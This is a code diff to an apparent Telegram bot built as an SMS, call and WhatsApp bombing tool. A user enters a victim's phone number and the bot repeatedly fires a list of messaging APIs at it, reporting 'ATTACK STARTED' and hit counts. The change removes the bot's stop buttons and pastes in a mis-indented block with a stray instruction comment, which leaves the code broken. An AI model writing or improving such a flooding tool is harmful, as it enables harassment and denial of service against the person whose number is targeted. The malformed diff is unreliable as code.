@@ -1571,17 +1571,18 @@ async def handle_phone_number(message: types.Message):
     asyncio.create_task(run_attack(user_id, phone, message.chat.id, start_msg.message_id))
     
     # Update with initial status
-    await bot.edit_message_text(
-        chat_id=message.chat.id,
-        message_id=start_msg.message_id,
-        text=f"🚀 <b>ATTACK STARTED!</b>\n\n"
-             f"<b>Target:</b> <code>{phone}</code>\n"
-             f"<b>Status:</b> Firing APIs...\n"
-             f"<b>Hits:</b> 0\n"
-             f"<b>Next cycle:</b> 5s",
-        parse_mode="HTML",
-        reply_markup=create_stop_keyboard()
-    )
+   # In handle_phone_number function, change this:
+await bot.edit_message_text(
+    chat_id=message.chat.id,
+    message_id=start_msg.message_id,
+    text=f"🚀 <b>ATTACK STARTED!</b>\n\n"
+         f"<b>Target:</b> <code>{phone}</code>\n"
+         f"<b>Status:</b> Firing APIs...\n"
+         f"<b>Hits:</b> 0\n"
+         f"<b>Next cycle:</b> 5s",
+    parse_mode="HTML"
+    # REMOVED: reply_markup=create_stop_keyboard()
+)
 
 async def run_attack(user_id, phone, chat_id, message_id):
     """Run the attack loop"""
@@ -1598,20 +1599,16 @@ async def run_attack(user_id, phone, chat_id, message_id):
                 attack_info['cycles'] = cycle_count
                 stats['cycles'] = cycle_count
                 
-                # Fire all APIs
                 tasks = [hit_api(session, api, phone, stats) for api in ULTIMATE_APIS]
                 results = await asyncio.gather(*tasks, return_exceptions=True)
                 
-                # Calculate hits
                 calls = stats.get('Call', 0)
                 sms = stats.get('SMS', 0)
                 whatsapp = stats.get('WhatsApp', 0)
                 total = calls + sms + whatsapp
                 
-                # Update message
                 stats['last_update'] = time.strftime('%H:%M:%S')
                 
-                # Update status message
                 status_text = f"""
 🎯 <b>ACTIVE ATTACK - CYCLE {cycle_count}</b>
 
@@ -1634,24 +1631,21 @@ async def run_attack(user_id, phone, chat_id, message_id):
                         chat_id=chat_id,
                         message_id=message_id,
                         text=status_text,
-                        parse_mode="HTML",
-                        reply_markup=create_stop_keyboard()
+                        parse_mode="HTML"
+                        # REMOVED: reply_markup=create_stop_keyboard()
                     )
                 except Exception as e:
                     logger.error(f"Failed to update message: {e}")
                 
-                # Check if we should stop
                 if stop_signals.get(user_id, False):
                     break
                     
-                # Wait for next cycle
                 await asyncio.sleep(delay)
                 
             except Exception as e:
                 logger.error(f"Attack error for user {user_id}: {e}")
-                await asyncio.sleep(5)  # Wait before retry
+                await asyncio.sleep(5)
     
-    # Attack stopped
     final_stats = attack_stats.get(user_id, {})
     calls = final_stats.get('Call', 0)
     sms = final_stats.get('SMS', 0)
@@ -1680,8 +1674,8 @@ async def run_attack(user_id, phone, chat_id, message_id):
             chat_id=chat_id,
             message_id=message_id,
             text=final_text,
-            parse_mode="HTML",
-            reply_markup=create_main_keyboard()
+            parse_mode="HTML"
+            # REMOVED: reply_markup=create_main_keyboard()
         )
     except:
         pass
@@ -1691,7 +1685,6 @@ async def run_attack(user_id, phone, chat_id, message_id):
         del stop_signals[user_id]
     if user_id in user_attacks:
         del user_attacks[user_id]
-
 @dp.message(Command("stop"))
 async def stop_command(message: types.Message):
     """Handle /stop command"""
